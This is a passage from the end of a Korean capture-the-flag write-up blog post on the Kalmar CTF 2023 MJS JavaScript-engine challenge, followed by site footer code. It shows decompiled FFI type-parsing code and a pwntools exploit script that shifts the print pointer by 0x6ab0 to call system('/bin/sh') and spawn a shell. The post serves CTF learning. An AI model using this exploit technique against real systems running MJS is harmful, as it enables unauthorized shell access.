</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;void*&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;void *&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;struct mg_str&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;struct mg_str *&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;struct mg_str*&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;failed to parse val type </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%.*s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">LODWORD</span>(ms.len), ms.p);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">11</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이거 보고 잘 맞춰서 세팅해준다음에, system /bin/sh를 호출하면 된다.
offset 잘 계산하면 system 주소를 넣어줄 수 있다.</p>
<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
<p>익스플로잇이 되게 화가 난다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 
</span></span><span style="display:flex;"><span>off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6ab0</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;let a = print;a+=0x6ab0;a(&#34;int system(char*)&#34;)(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;./mjs&#34;</span>,<span style="color:#e6db74">&#34;-e&#34;</span>,payload])
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Kalmar_CTF_2023_MJS/image.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/kalmar-ctf-2023/">Kalmar CTF 2023</a></li>
      <li><a href="https://msh1307.kr/tags/mjs-js-engine/">MJS js engine</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
